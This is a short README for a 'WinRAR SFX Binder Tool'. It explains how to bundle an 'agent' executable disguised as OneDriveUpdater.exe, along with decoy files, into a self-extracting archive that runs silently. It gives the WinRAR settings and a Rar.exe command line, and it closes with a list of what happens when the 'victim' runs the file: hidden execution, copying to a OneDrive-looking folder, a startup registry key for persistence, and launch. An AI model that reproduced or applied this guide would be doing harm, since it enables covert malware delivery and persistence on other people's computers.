# WinRAR SFX Binder Tool

## How To Create Silent Installer

### Step 1: Prepare Files
Put these files in the `binder` folder:
- `OneDriveUpdater.exe` (your agent)
- `install.bat` (already created)
- Any other files you want to bundle (installer, video, etc.)

### Step 2: Create SFX Archive
1. Open WinRAR
2. Select ALL files in the `binder` folder
3. Right-click → "Add to archive..."
4. Settings:
   - Archive name: `YourApp.exe`
   - Check "Create SFX archive"
   - Click "Advanced" → "SFX options..."

### Step 3: SFX Options
In the SFX options dialog:

**General tab:**
- Path to extract: `%TEMP%`

**Setup tab:**
- Run after extraction: `install.bat`
- (Add other files to run here if needed)

**Modes tab:**
- Check "Unpack to temporary folder"
- Silent mode: "Hide all"

**Update tab:**
- Overwrite mode: "Overwrite all files"

### Step 4: Build
Click OK → OK to create the SFX.

---

## Alternative: Command Line Method
```cmd
"C:\Program Files\WinRAR\Rar.exe" a -sfx -z"sfx_config.txt" output.exe OneDriveUpdater.exe install.bat other_file.exe
```

## What Happens When Victim Runs SFX:
1. Extract all files to %TEMP% (silent)
2. Run install.bat (hidden)
3. Agent copied to %LOCALAPPDATA%\Microsoft\OneDrive\
4. Registry key added for startup
5. Agent launched
6. Other bundled files run
